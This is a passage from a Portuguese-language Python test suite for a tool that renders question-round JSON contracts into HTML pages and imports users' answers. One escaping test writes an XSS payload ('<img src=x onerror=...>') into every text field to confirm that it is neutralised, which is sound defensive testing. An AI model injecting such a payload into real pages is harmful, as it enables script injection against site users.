        self.assertTrue('resolucao: a.resolucao === "manter" ? "manter" : null' in self.html,
                        "o 'manter' não sobreviveria à recarga")

class TestGrillSemResiduo(unittest.TestCase):
    """As mesmas três lições da Task 5, aplicadas à página de grill desde o começo."""

    RESIDUOS_CONHECIDOS = ("stay", "Stay", "apartamento", "2026-08-19", "19/08/2026",
                           "27e54fe6", "Rodada 1 de perguntas", "7 perguntas", "0 de 7",
                           "MCP próprio do Stay", "Iris-design", "agent-aeb09e2e2a9ae250e",
                           "Tarefa (exemplo)", "dados de exemplo do protótipo")

    @staticmethod
    def _contrato_generico(tag, rodada, quantas, irreversivel=True):
        return {"schema_version": "grill-rodada-v1", "tarefa_id": f"tarefa-{tag}-2026-08-21",
                "gerado_em": "2026-08-21T09:00:00-03:00", "rodada": rodada,
                "produzido_por": {"agente": "a", "modelo": "b", "sessao_id": "c",
                                  "transcript_jsonl": "d"},
                "tarefa": {"pergunta_original": f"Pergunta sobre {tag}?",
                           "objetivo": f"Objetivo de {tag}.",
                           "direcao_escolhida": f"Caminho de {tag}"},
                "perguntas": [{"id": f"{tag}-q{i}", "pergunta": f"Pergunta {i} de {tag}?",
                               "impacto_curto": f"Impacto {i}.",
                               "reversivel": not (irreversivel and i == 0),
                               "irreversivel_aviso": (f"Difícil voltar atrás em {tag}."
                                                      if irreversivel and i == 0 else None),
                               "contexto": f"Contexto {i} de {tag}.",
                               "origem": f"Origem {i} de {tag}.",
                               "botoes": ["aprovar", "rejeitar", "duvida"],
                               "opcoes": [{"id": f"{tag}-q{i}-o{j}", "titulo": f"Opção {j}",
                                           "detalhe": f"Detalhe {j} de {tag}.",
                                           "ganha": f"Ganha {j}.", "abre_mao": f"Abre mão {j}.",
                                           "recomendada": j == 0}
                                          for j in range(2)]}
                              for i in range(quantas)]}

    @classmethod
    def _limpar_nulos(cls, contrato):
        for pergunta in contrato["perguntas"]:
            if pergunta.get("irreversivel_aviso") is None:
                pergunta.pop("irreversivel_aviso")
        return contrato

    def setUp(self):
        self.neutro = self._limpar_nulos(self._contrato_generico("mural", 3, 2))

    def test_o_contrato_generico_e_valido(self):
        erros = (validar_contra_schema(self.neutro, carregar_schema("grill-rodada-v1"))
                 + regras_extras(self.neutro))
        self.assertEqual(erros, [], "o contrato de teste precisa ser válido de verdade")

    def test_nenhum_literal_da_semente_sobrevive(self):
        arquivo = re.sub(r"data:[a-z/]+;base64,[A-Za-z0-9+/=]+", "«ativo»",
                         render_grill(self.neutro))
        for termo in self.RESIDUOS_CONHECIDOS:
            self.assertFalse(termo in arquivo, f"resíduo da semente na página: {termo!r}")

    def test_contagem_rodada_e_tarefa_vem_do_contrato(self):
        pagina = render_grill(self.neutro)
        visivel = " ".join(re.sub(r"<[^>]+>", " ",
                                  re.sub(r"<(script|style|title).*?</\1>", " ", pagina,
                                         flags=re.S)).split())
        for esperado in ("2 perguntas", "Rodada 3", "0 de 2 respondidas",
                         "Pergunta sobre mural?", "Caminho de mural"):
            self.assertTrue(esperado in visivel, f"faltou vir do contrato: {esperado!r}")
        uma = self._limpar_nulos(self._contrato_generico("horta", 1, 1, irreversivel=False))
        so_uma = " ".join(re.sub(r"<[^>]+>", " ", render_grill(uma)).split())
        self.assertTrue("1 pergunta" in so_uma and "1 perguntas" not in so_uma,
                        "plural errado com uma pergunta só")
        self.assertTrue('aria-valuemax="2"' in pagina,
                        "o progresso ainda anuncia a contagem fixa do protótipo")
        self.assertFalse("Pergunta 1 de 7" in pagina,
                         "o wizard ainda traz a contagem da rodada que serviu de semente")

    def test_prosa_estrutural_esta_toda_no_inventario_auditado(self):
        uniao = set()
        for contrato in (self.neutro,
                         self._limpar_nulos(self._contrato_generico("horta", 1, 1, False)),
                         self._limpar_nulos(self._contrato_generico("cafe", 12, 3)),
                         json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                                    .read_text(encoding="utf-8"))):
            uniao |= prosa_estrutural(render_grill(contrato))
        inventario = {linha.strip() for linha
                      in (PASTA_DE_TEMPLATES / "prosa-estrutural-grill.txt")
                      .read_text(encoding="utf-8").splitlines()
                      if linha.strip() and not linha.startswith("#")}
        novas = uniao - inventario
        self.assertEqual(novas, set(), f"prosa nova sem auditoria: {sorted(novas)[:5]}")
        self.assertGreater(len(inventario), 60, "o inventário parece truncado")
        for frase in inventario:
            for termo in self.RESIDUOS_CONHECIDOS:
                self.assertFalse(termo in frase, f"resíduo dentro do inventário: {frase[:60]!r}")

    def test_todo_campo_de_texto_do_contrato_e_escapado(self):
        base = self._fixture_maxima()
        padroes = set(TestEscapeEmTodoCampo._padroes_de_texto_do_schema(
            carregar_schema("grill-rodada-v1")))
        presentes = {re.sub(r"\.(\d+)(?=\.|$)", "[]", ".".join(str(p) for p in ("$",) + caminho))
                     for caminho in TestEscapeEmTodoCampo._caminhos_de_texto(base)}
        self.assertEqual({p for p in padroes if p not in presentes}, set(),
                         "a fixture de ataque não cobre o schema do grill")
        for caminho in TestEscapeEmTodoCampo._caminhos_de_texto(base):
            documento = json.loads(json.dumps(base))
            TestEscapeEmTodoCampo._grava_em(documento, caminho, '<img src=x onerror="alert(1)">')
            markup = TestEscapeEmTodoCampo._markup(render_grill(documento))
            trilha = ".".join(str(p) for p in caminho)
            self.assertFalse("<img src=x" in markup, f"campo sem escape: {trilha}")

    @staticmethod
    def _fixture_maxima():
        base = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                          .read_text(encoding="utf-8"))
        base["prototipo"] = True
        base["exemplo"] = True
        base["aviso_prototipo"] = "PROTÓTIPO — dados de exemplo"
        base["versao_prototipo"] = "v2 de teste"
        base["export"] = {"schema_version": "grill-respostas-v1",
                          "chave_localstorage": "temcomo:x:grill-rodada-1",
                          "storage_key": "temcomo:x:grill-rodada-1",
                          "nome_arquivo": "x.json", "download_nome": "x.json",
                          "estados": ["pendente"], "observacao": "observação"}
        base["tarefa"] = {"pergunta_original": "p", "objetivo": "o", "direcao_escolhida": "d"}
        for pergunta in base["perguntas"]:
            pergunta.setdefault("contexto", "contexto")
            pergunta.setdefault("origem", "origem")
            pergunta.setdefault("irreversivel_aviso", "aviso de irreversibilidade")
            for opcao in pergunta["opcoes"]:
                opcao.setdefault("fora_da_caixa", False)
                opcao.setdefault("recomendada", False)
        return base

class TestRestauracaoNoGrill(unittest.TestCase):
    """Decisão 17 na página de grill, executando o JavaScript real (quando há Node)."""

    HARNESS = """
    const fs = require("fs");
    const pagina = fs.readFileSync(process.argv[2], "utf8");
    function corpoDaFuncao(nome) {
      const inicio = pagina.indexOf("function " + nome + "(");
      if (inicio < 0) throw new Error("não achei a função " + nome);
      let nivel = 0;
      for (let j = pagina.indexOf("{", inicio); j < pagina.length; j++) {
        if (pagina[j] === "{") nivel++;
        else if (pagina[j] === "}" && --nivel === 0) return pagina.slice(inicio, j + 1);
      }
      throw new Error("função " + nome + " não fecha");
    }
    let draft = { anotacoes: [] };
    const TRECHO_NAO_RECUPERADO = "(trecho não recuperado do rascunho)";
    const BLOCO_NAO_RECUPERADO = "(bloco não recuperado do rascunho)";
    const botoesEnvio = [{ disabled: false }, { disabled: false }];
    const caixaIncompletas = { hidden: true, innerHTML: "", querySelectorAll() { return []; } };
    global.document = {
      querySelectorAll(seletor) {
        return seletor === ".btn-copy, .btn-download" ? botoesEnvio : [];
      },
      getElementById(id) { return id === "anotacoes-incompletas" ? caixaIncompletas : null; }
    };
    const abertura = '<script type="application/json" id="contrato-json">';
    const inicioContrato = pagina.indexOf(abertura) + abertura.length;
    const CONTRATO = JSON.parse(pagina.slice(inicioContrato, pagina.indexOf("</script>", inicioContrato)));
    const PERGUNTAS = CONTRATO.perguntas;
    const TAREFA_ID = CONTRATO.tarefa_id;
    const RODADA = CONTRATO.rodada;
    const EXPORT_SCHEMA = CONTRATO.export.schema_version;
    const pristine = {};
    const blocoEl = {};
    function updatePanelCount() {}
    function updateRow() {}
    let contador = 0;
    function annotId() { return "gerado-" + (++contador); }
    const inicioSem = pagina.indexOf("var SEM_CONTEUDO =");
    eval(pagina.slice(inicioSem, pagina.indexOf("})();", inicioSem) + 5));
    eval(corpoDaFuncao("temConteudo"));
    eval(corpoDaFuncao("idInternoEstavel"));
    eval(corpoDaFuncao("sanitizeAnnot"));
    eval(corpoDaFuncao("sanitizarAnotacoes"));
    eval(corpoDaFuncao("anotacoesPendentes"));
    eval(corpoDaFuncao("registrarAncoraPerdida"));
    eval(corpoDaFuncao("escTexto"));
    eval(corpoDaFuncao("botoesDeEnvio"));
    const linhaLimites = pagina.match(/var LIMITES_DE_TEXTO = \\{[^;]*\\};/)[0];
    eval(linhaLimites);
    eval(pagina.match(/var CONTRATO_SHA = "[0-9a-f]{64}";/)[0]);
    eval(corpoDaFuncao("conferirLimite"));
    eval(corpoDaFuncao("camposEstourados"));
    eval(corpoDaFuncao("envioTravado"));
    eval(corpoDaFuncao("pintarCamposEstourados"));
    eval(corpoDaFuncao("atualizarTravas"));
    eval(corpoDaFuncao("pintarAnotacoesIncompletas"));
    eval(corpoDaFuncao("resolveAnchor"));
    eval(corpoDaFuncao("paintAll"));
    eval(corpoDaFuncao("buildEnvelope"));
    eval(corpoDaFuncao("resolverAnotacao"));
    function persistNow() {}
    const doRascunho = [
      { id: "a-inteira", bloco_id: "q1::contexto", trecho: "um trecho de verdade",
        comentario: "esta está inteira", criado_em: "2026-08-20T10:00:00Z" },
      { id: "a-sem-trecho", bloco_id: "q1::contexto", trecho: "",
        comentario: "perdi o trecho", criado_em: "2026-08-20T10:01:00Z" },
      { id: "a-sem-bloco", trecho: "sobrou o trecho", comentario: "perdi a âncora",
        criado_em: "2026-08-20T10:02:00Z" },
      { id: "a-so-comentario", comentario: "só sobrou o que eu escrevi" },
      { id: "a-invisivel", bloco_id: "q1::contexto", trecho: "x",
        comentario: "\\u200b\\u200c\\u2060", criado_em: "2026-08-20T10:03:00Z" },
      { nada: true }
    ];
    draft.anotacoes = sanitizarAnotacoes(doRascunho);
    const idInstavel = sanitizeAnnot({ id: "a" + String.fromCharCode(0) + "quebrada",
      bloco_id: "q1::contexto", trecho: "trecho", comentario: "preservar este bilhete" });
    const idsHostis = sanitizarAnotacoes([
      { id: "", bloco_id: "q1::contexto", trecho: "t", comentario: "id vazio",
        criado_em: "2026-08-20T11:00:00Z" },
      { id: "\\u200b", bloco_id: "q1::contexto", trecho: "t", comentario: "id invisível",
        criado_em: "2026-08-20T11:01:00Z" },
      { id: "repetido", bloco_id: "q1::contexto", trecho: "t", comentario: "primeiro",
        criado_em: "2026-08-20T11:02:00Z" },
      { id: "repetido", bloco_id: "q1::contexto", trecho: "t", comentario: "segundo",
        criado_em: "2026-08-20T11:03:00Z" },
      { id: "emoji-🙂", bloco_id: "q1::contexto", trecho: "t", comentario: "emoji válido",
        criado_em: "2026-08-20T11:04:00Z" },
      { id: "alto-" + String.fromCharCode(0xD800), bloco_id: "q1::contexto", trecho: "t",
        comentario: "substituto isolado", criado_em: "2026-08-20T11:05:00Z" }
    ]);
    const restauradas = draft.anotacoes.slice();
    const pendentes = anotacoesPendentes().map(a => a.id);
    const paintAllReal = paintAll;
    paintAll = function () { pintarAnotacoesIncompletas(); };
    resolverAnotacao("a-sem-trecho", "manter");
    resolverAnotacao("a-sem-bloco", "manter");
    resolverAnotacao("a-so-comentario", "manter");
    const decisoes = { pendentes: anotacoesPendentes().map(a => a.id),
      botoes: botoesEnvio.map(b => b.disabled) };
    draft.anotacoes = [sanitizeAnnot({ id: "a-descartar", comentario: "jogar fora" })];
    resolverAnotacao("a-descartar", "descartar");
    decisoes.descartada = draft.anotacoes.length === 0;
    paintAll = paintAllReal;
    // âncora que existe no rascunho mas não resolve no documento
    const fantasma = sanitizeAnnot({ id: "a-fantasma", bloco_id: "bloco-que-sumiu",
      trecho: "algum trecho", comentario: "bilhete", criado_em: "2026-08-20T10:04:00Z" });
    const antesDoBoot = fantasma.incompleta;
    draft.anotacoes = [fantasma];
    pintarAnotacoesIncompletas();
    const botoesAntesDePintar = botoesEnvio.map(b => b.disabled);
    paintAll();
    const botoesDepoisDePintar = botoesEnvio.map(b => b.disabled);
    const caixaDepoisDePintar = caixaIncompletas.hidden;
    fantasma.resolucao = "manter";
    restauradas.forEach(a => { if (a.incompleta) a.resolucao = "manter"; });
    draft.anotacoes = restauradas.concat([fantasma]);
    draft.respostas = Object.create(null);
    PERGUNTAS.forEach(q => {
      draft.respostas[q.id] = { estado: "pendente", escolha_id: q.opcoes[0].id,
        comentario: "", duvida_texto: "" };
    });
    const momento = "2026-08-21T12:00:00Z";
    const exportado = buildEnvelope(momento);
    const exportadas = exportado.anotacoes;
    // e o "manter" precisa sobreviver a salvar e restaurar
    const mantida = sanitizeAnnot({ id: "a-mantida", bloco_id: "b", trecho: "t",
      comentario: "mandei manter", criado_em: "2026-08-20T10:05:00Z" });
    registrarAncoraPerdida(mantida);
    mantida.resolucao = "manter";
    const depoisDaRecarga = JSON.parse(JSON.stringify([mantida])).map(sanitizeAnnot);
    depoisDaRecarga.forEach(registrarAncoraPerdida);
    const guardadas = draft.anotacoes;
    draft.anotacoes = depoisDaRecarga;
    const pendentesAposRecarga = anotacoesPendentes().map(a => a.id);
    draft.anotacoes = guardadas;
    console.log(JSON.stringify({
      restauradas: restauradas.map(a => a.id),
      idInstavel: { id: idInstavel.id, comentario: idInstavel.comentario },
      idsHostis: idsHostis.map(a => a.id),
      pendentes: pendentes,
      decisoes: decisoes,
      exportadas: exportadas,
      exportado: exportado,
      fantasma: { antes: antesDoBoot, depois: fantasma.incompleta,
                  status: fantasma.ancora_status,
                  botoesAntes: botoesAntesDePintar, botoesDepois: botoesDepoisDePintar,
                  caixaOcultaDepois: caixaDepoisDePintar },
      recarga: { resolucao: depoisDaRecarga[0].resolucao,
                 incompleta: depoisDaRecarga[0].incompleta,
                 pendentes: pendentesAposRecarga }
    }));
    """

    def test_nada_e_descartado_sem_o_usuario_mandar(self):
        node = shutil.which("node")
        if not node:
            self.skipTest("Node não está instalado nesta máquina")
        contrato = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                              .read_text(encoding="utf-8"))
        with tempfile.TemporaryDirectory() as pasta:
            pagina = Path(pasta) / "grill.html"
            pagina.write_text(render_grill(contrato), encoding="utf-8")
            script = Path(pasta) / "harness.cjs"
            script.write_text(self.HARNESS, encoding="utf-8")
            saida = subprocess.run([node, str(script), str(pagina)],
                                   capture_output=True, text=True)
            self.assertEqual(saida.returncode, 0, saida.stderr[-900:])
            resultado = json.loads(saida.stdout)

        # `a-invisivel` tem âncora inteira e comentário só com invisíveis. Até a
        # auditoria cega ela era descartada no reload; agora sobrevive como marcador,
        # porque a interface promete que o comentário pode ficar em branco. Some só
        # o que não tem nada: nem bilhete, nem trecho, nem âncora.
        self.assertEqual(resultado["restauradas"],
                         ["a-inteira", "a-sem-trecho", "a-sem-bloco", "a-so-comentario",
                          "a-invisivel"],
                         "anotação com conteúdo humano descartada, ou lixo preservado")
        self.assertNotIn("\x00", resultado["idInstavel"]["id"])
        self.assertEqual(resultado["idInstavel"]["comentario"], "preservar este bilhete")
        ids_hostis = resultado["idsHostis"]
        self.assertEqual(len(ids_hostis), len(set(ids_hostis)), ids_hostis)
        self.assertTrue(all(conteudo_visivel(identificador) for identificador in ids_hostis))
        self.assertTrue(all(not any(0xD800 <= ord(c) <= 0xDFFF for c in identificador)
                            for identificador in ids_hostis))
        self.assertIn("emoji-🙂", ids_hostis, "par substituto válido não foi preservado")
        self.assertEqual(resultado["pendentes"],
                         ["a-sem-trecho", "a-sem-bloco", "a-so-comentario"],
                         "anotação incompleta não foi para a fila de confirmação")
        self.assertEqual(resultado["decisoes"],
                         {"pendentes": [], "botoes": [False, False], "descartada": True},
                         "manter/jogar fora não resolveu a fila como o usuário mandou")
        por_id = {a["id"]: a for a in resultado["exportadas"]}
        self.assertEqual(por_id["a-inteira"]["ancora_status"], "resolvida")
        self.assertEqual(por_id["a-inteira"]["trecho"], "um trecho de verdade")
        for identificador in ("a-sem-trecho", "a-sem-bloco", "a-so-comentario", "a-fantasma"):
            anotacao = por_id[identificador]
            self.assertEqual(anotacao["ancora_status"], "orfa", identificador)
            self.assertTrue(anotacao["bloco_id"] and anotacao["trecho"], identificador)
            self.assertGreaterEqual(len(anotacao["criado_em"]), 10, identificador)
        self.assertEqual(por_id["a-sem-bloco"]["bloco_id"], "(bloco não recuperado do rascunho)")
        self.assertEqual(por_id["a-sem-trecho"]["trecho"], "(trecho não recuperado do rascunho)")
        self.assertEqual(por_id["a-fantasma"]["bloco_id"], "bloco-que-sumiu")
        self.assertEqual(por_id["a-fantasma"]["trecho"], "algum trecho")
        self.assertEqual(resultado["fantasma"],
                         {"antes": False, "depois": True, "status": "orfa",
                          "botoesAntes": [False, False], "botoesDepois": [True, True],
                          "caixaOcultaDepois": False},
                         "âncora que não resolve escapou da fila")
        self.assertEqual(resultado["recarga"],
                         {"resolucao": "manter", "incompleta": False, "pendentes": []},
                         "o 'manter' foi esquecido depois da recarga")

        exportado = resultado["exportado"]
        erros = (validar_contra_schema(exportado, carregar_schema("grill-respostas-v1"))
                 + regras_extras(exportado))
        self.assertEqual(erros, [], "o export resolvido não passa no próprio motor")

class TestRenderizarArquivo(unittest.TestCase):
    """`renderizar` grava em html/NN-*.html, numerando e nunca sobrescrevendo."""

    def setUp(self):
        self._temp = tempfile.TemporaryDirectory()
        self.raiz = Path(self._temp.name)
        self.addCleanup(self._temp.cleanup)
        self.pasta = criar_tarefa(self.raiz, "Lançar apartamentos do Stay pelo chat", "2026-08-20")
        self.contrato = self.pasta / "contratos" / "03-direcoes.json"
        dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / "direcoes.json")
                          .read_text(encoding="utf-8"))
        dado["tarefa_id"] = self.pasta.name
        self.contrato.write_text(json.dumps(dado, ensure_ascii=False, indent=2), encoding="utf-8")

    def _contrato_grill(self, rodada=7):
        grill = self.pasta / "contratos" / f"04-grill-rodada-{rodada}.json"
        dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                          .read_text(encoding="utf-8"))
        dado["tarefa_id"] = self.pasta.name
        dado["rodada"] = rodada
        grill.write_text(json.dumps(dado, ensure_ascii=False, indent=2), encoding="utf-8")
        return grill

    def test_numeracao_sequencial_sem_sobrescrever(self):
        primeiro = renderizar_contrato(self.contrato)
        self.assertEqual(primeiro.name, "01-direcoes.html")
        antes = primeiro.read_bytes()
        segundo = renderizar_contrato(self.contrato)
        self.assertEqual(segundo.name, "02-direcoes.html")
        self.assertEqual(primeiro.read_bytes(), antes, "o render anterior foi sobrescrito")
        self.assertEqual(segundo.read_bytes(), antes, "mesmo contrato deveria dar mesmos bytes")

    def test_grill_leva_a_rodada_no_nome(self):
        grill = self._contrato_grill()
        primeiro = renderizar_contrato(grill)
        segundo = renderizar_contrato(grill)
        self.assertEqual(primeiro.name, "01-grill-rodada-7.html")
        self.assertEqual(segundo.name, "02-grill-rodada-7.html")

    def test_numeracao_avanca_apos_lacuna_sem_sobrescrever(self):
        grill = self._contrato_grill()
        pasta_html = self.pasta / "html"
        pasta_html.mkdir(exist_ok=True)
        anterior = pasta_html / "07-registro-anterior.html"
        anterior.write_text("não sobrescrever", encoding="utf-8")

        gerado = renderizar_contrato(grill)
        self.assertEqual(gerado.name, "08-grill-rodada-7.html")
        self.assertEqual(anterior.read_text(encoding="utf-8"), "não sobrescrever")

    def test_cli_recusa_grill_invalido_em_portugues_sem_rastro(self):
        grill = self.pasta / "contratos" / "04-grill-invalido.json"
        dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / "grill-rodada.json")
                          .read_text(encoding="utf-8"))
        dado.pop("perguntas")
        grill.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        erro = io.StringIO()
        with contextlib.redirect_stderr(erro), self.assertRaises(SystemExit) as ctx:
            main(["renderizar", str(grill)])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("campo obrigatório ausente", erro.getvalue())
        self.assertNotIn("Traceback", erro.getvalue())
        self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(sem_citacoes(erro.getvalue()))),
                         [], erro.getvalue())

    def test_cli_renderiza_e_recusa_contrato_sem_renderizador(self):
        saida = io.StringIO()
        with contextlib.redirect_stdout(saida):
            main(["renderizar", str(self.contrato)])
        self.assertIn("01-direcoes.html", saida.getvalue())
        objetivo = self.pasta / "contratos" / "01-objetivo.json"
        dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / "objetivo.json")
                          .read_text(encoding="utf-8"))
        dado["tarefa_id"] = self.pasta.name
        objetivo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
        erro = io.StringIO()
        with contextlib.redirect_stderr(erro), self.assertRaises(SystemExit) as ctx:
            main(["renderizar", str(objetivo)])
        self.assertEqual(ctx.exception.code, 1)
        self.assertIn("objetivo-v1", erro.getvalue())
        self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(sem_citacoes(erro.getvalue()))),
                         [], erro.getvalue())

    def test_contrato_solto_fora_de_pasta_de_tarefa(self):
        avulso = self.raiz / "direcoes-avulso.json"
        avulso.write_text(self.contrato.read_text(encoding="utf-8"), encoding="utf-8")
        gerado = renderizar_contrato(avulso)
        self.assertEqual(gerado.parent, self.raiz / "html")
        self.assertEqual(gerado.name, "01-direcoes.html")

def carimbar_resposta_de_teste(dado: dict, pasta: Path) -> dict:
    """Põe no export o carimbo do contrato que está NA PASTA (uso: fixtures de teste).

    As fixtures reescrevem `tarefa_id`, e isso já muda o sha canônico do contrato — o
    mesmo efeito que o saneamento provoca. Sem recarimbar, a fixture nasceria divergente
    e o motor a recusaria com razão."""
    origens = {"decisao-direcoes-v1": "contratos/03-direcoes.json",
               "grill-respostas-v1": "contratos/04-grill-rodada-{rodada}.json"}
    molde = origens.get(dado.get("schema_version"))
    if not molde:
        return dado
    origem = Path(pasta) / molde.format(rodada=dado.get("rodada"))
    if origem.exists():
        dado["contrato_sha256"] = sha_do_contrato(
            json.loads(origem.read_text(encoding="utf-8")))
    return dado


class TestImportar(unittest.TestCase):
    """Task 7: a devolução do usuário entra na pasta da tarefa pelos gates certos."""

    DATA = "2026-08-21"

    def setUp(self):
        self._temp = tempfile.TemporaryDirectory()
        self.raiz = Path(self._temp.name)
        self.addCleanup(self._temp.cleanup)
        self.pasta = criar_tarefa(self.raiz, "Lançar apartamentos do Stay pelo chat", self.DATA)
        for destino, exemplo in (("contratos/01-objetivo.json", "objetivo.json"),
                                 ("contratos/02-pesquisa.json", "pesquisa.json"),
                                 ("contratos/03-direcoes.json", "direcoes.json")):
            self._grava(destino, exemplo)
        avancar_etapa(self.pasta, "objetivo-confirmado", data=self.DATA)
        avancar_etapa(self.pasta, "pesquisa-concluida", data=self.DATA)

    # Onde cada export foi respondido: o carimbo sai do contrato que está NA PASTA, não do
    # exemplo de origem. Reescrever `tarefa_id` já muda o sha canônico — é o mesmo efeito
    # que o saneamento da lane-conteudo provoca, e o carimbo tem de acompanhar.
    CONTRATO_DE_ORIGEM = {"decisao-direcoes-v1": "contratos/03-direcoes.json",
                          "grill-respostas-v1": "contratos/04-grill-rodada-{rodada}.json"}

    def _dado(self, exemplo, ajustes=None):
        dado = json.loads((PASTA_DE_EXEMPLOS / "validos" / exemplo).read_text(encoding="utf-8"))
        dado["tarefa_id"] = self.pasta.name
        dado.update(ajustes or {})
        molde = self.CONTRATO_DE_ORIGEM.get(dado.get("schema_version"))
        if molde and "contrato_sha256" not in (ajustes or {}):
            origem = self.pasta / molde.format(rodada=dado.get("rodada"))
            if origem.exists():
                dado["contrato_sha256"] = sha_do_contrato(
                    json.loads(origem.read_text(encoding="utf-8")))
        return dado

    def _grava(self, destino, exemplo, ajustes=None):
        alvo = self.pasta / destino
        alvo.parent.mkdir(parents=True, exist_ok=True)
        alvo.write_text(json.dumps(self._dado(exemplo, ajustes), ensure_ascii=False, indent=2),
                        encoding="utf-8")
        return alvo

    def _export(self, exemplo, ajustes=None, nome="export.json"):
        arquivo = self.raiz / nome
        arquivo.write_text(json.dumps(self._dado(exemplo, ajustes), ensure_ascii=False, indent=2),
                           encoding="utf-8")
        return arquivo

    def _reprova(self, *args, **kwargs):
        saida = io.StringIO()
        with contextlib.redirect_stderr(saida), self.assertRaises(SystemExit) as ctx:
            importar_resposta(*args, **kwargs)
        self.assertEqual(ctx.exception.code, 1)
        self.assertNotIn("Traceback", saida.getvalue())
        self.assertEqual(achar_ingles(prosa_sem_detalhe_tecnico(sem_citacoes(
            saida.getvalue()))), [], saida.getvalue())
        return saida.getvalue()

    def test_fluxo_feliz_de_direcoes_avanca_a_etapa(self):
        export = self._export("decisao-direcoes.json")
        destino = importar_resposta(export, self.pasta)
        self.assertEqual(destino, self.pasta / "respostas" / "decisao-direcoes.json")
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "direcao-escolhida")
        self.assertEqual(json.loads(destino.read_text(encoding="utf-8"))["direcao_escolhida"],
                         "mcp-stay")

    def test_direcoes_pendente_e_recusada(self):
        export = self._export("decisao-direcoes.json",
                              {"estado": "pendente", "direcao_escolhida": None})
        saida = self._reprova(export, self.pasta)
        self.assertIn("pendente", saida)
        self.assertEqual(carregar_tarefa(self.pasta)["etapa"], "pesquisa-concluida")
        self.assertFalse((self.pasta / "respostas" / "decisao-direcoes.json").exists(),
                         "gravou a resposta mesmo recusando")

    def test_resposta_de_outra_tarefa_e_recusada(self):
        export = self._export("decisao-direcoes.json", {"tarefa_id": "outra-tarefa-2026-01-01"})
        self.assertIn("tarefa_id", self._reprova(export, self.pasta))
        # a recusa tem de vir ANTES de gravar: a jornada também reprovaria depois, mas aí
        # o arquivo alheio já estaria dentro da pasta desta tarefa.
        self.assertEqual(sorted(p.name for p in (self.pasta / "respostas").glob("*")), [],
                         "gravou a resposta de outra tarefa antes de recusar")

    def test_nao_sobrescreve_resposta_ja_importada(self):
        self._importa_direcoes()
        antes = (self.pasta / "respostas" / "decisao-direcoes.json").read_bytes()
        segundo = self._export("decisao-direcoes.json", {"comentario": "mudei de ideia"},
                               nome="export2.json")
        self.assertIn("já", self._reprova(segundo, self.pasta))
        self.assertEqual((self.pasta / "respostas" / "decisao-direcoes.json").read_bytes(), antes)

    def _importa_direcoes(self):
        return importar_resposta(self._export("decisao-direcoes.json"), self.pasta)

    def _prepara_rodada(self, rodada=1, apontar=True):
        self._importa_direcoes()
        self._grava(f"contratos/04-grill-rodada-{rodada}.json", "grill-rodada.json",
                    {"rodada": rodada})
        registro = carregar_tarefa(self.pasta)
        registro["rodada_de_grill_pendente"] = rodada if apontar else None
        gravar_tarefa(self.pasta, registro)

    def test_grill_completo_registra_a_rodada(self):
        self._prepara_rodada()
        self.assertEqual(carregar_tarefa(self.pasta)["rodada_de_grill_pendente"], 1)
        export = self._export("grill-respostas.json", {"rodada": 1})
        destino = importar_resposta(export, self.pasta)
        self.assertEqual(destino.name, "grill-rodada-1.json")
        tarefa = carregar_tarefa(self.pasta)
        self.assertIsNone(tarefa["rodada_de_grill_pendente"],
                          "a rodada respondida continuou marcada como pendente")
        self.assertEqual(tarefa["etapa"], "direcao-escolhida",
                         "o grill só fecha a etapa pelo consolidado, não por uma rodada")

    def test_rodada_aberta_sem_o_registro_apontar(self):
        # O disco é a autoridade: contrato escrito e sem resposta é rodada aberta.
        self._prepara_rodada(apontar=False)
        destino = importar_resposta(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertEqual(destino.name, "grill-rodada-1.json")

    def test_registro_apontando_rodada_ja_respondida_nao_trava_a_tarefa(self):
        self._prepara_rodada(rodada=1)
        importar_resposta(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self._grava("contratos/04-grill-rodada-2.json", "grill-rodada.json", {"rodada": 2})
        registro = carregar_tarefa(self.pasta)
        registro["rodada_de_grill_pendente"] = 1        # cache velho, apontando a já respondida
        gravar_tarefa(self.pasta, registro)
        destino = importar_resposta(
            self._export("grill-respostas.json", {"rodada": 2}, nome="r2.json"), self.pasta)
        self.assertEqual(destino.name, "grill-rodada-2.json")

    def test_grill_de_rodada_errada_e_recusado(self):
        self._prepara_rodada(rodada=1)
        export = self._export("grill-respostas.json", {"rodada": 2})
        saida = self._reprova(export, self.pasta)
        # "rodada" sozinho não serve: qualquer erro do grill diria isso. A recusa precisa
        # dizer qual é a rodada aberta — é isso que o usuário tem de saber para se corrigir.
        self.assertIn("rodada aberta desta tarefa é a 1", saida)
        self.assertFalse(any((self.pasta / "respostas").glob("grill-*.json")))

    def test_grill_sem_nenhuma_rodada_aberta_e_recusado(self):
        # Sem este gate a recusa sairia dizendo que a rodada aberta "é a None".
        self._importa_direcoes()
        saida = self._reprova(self._export("grill-respostas.json", {"rodada": 1}), self.pasta)
        self.assertIn("não tem rodada de grill esperando resposta", saida)
        self.assertNotIn("None", saida)

    def test_grill_com_pergunta_faltante_e_recusado(self):
        self._prepara_rodada()
        completo = self._dado("grill-respostas.json", {"rodada": 1})
        faltando = json.loads(json.dumps(completo))
        faltando["respostas"] = faltando["respostas"][:1]
        arquivo = self.raiz / "incompleto.json"
        arquivo.write_text(json.dumps(faltando, ensure_ascii=False), encoding="utf-8")
        saida = self._reprova(arquivo, self.pasta)
        self.assertIn("q-auditoria", saida, "a mensagem precisa nomear a pergunta que faltou")

    def test_grill_com_pergunta_desconhecida_e_recusado(self):
        self._prepara_rodada()
        dado = self._dado("grill-respostas.json", {"rodada": 1})
        dado["respostas"].append({"pergunta_id": "q-inventada", "estado": "aprovada",
                                  "escolha_id": "x", "comentario": "", "duvida_texto": ""})
        arquivo = self.raiz / "sobrando.json"
        arquivo.write_text(json.dumps(dado, ensure_ascii=False), encoding="utf-8")
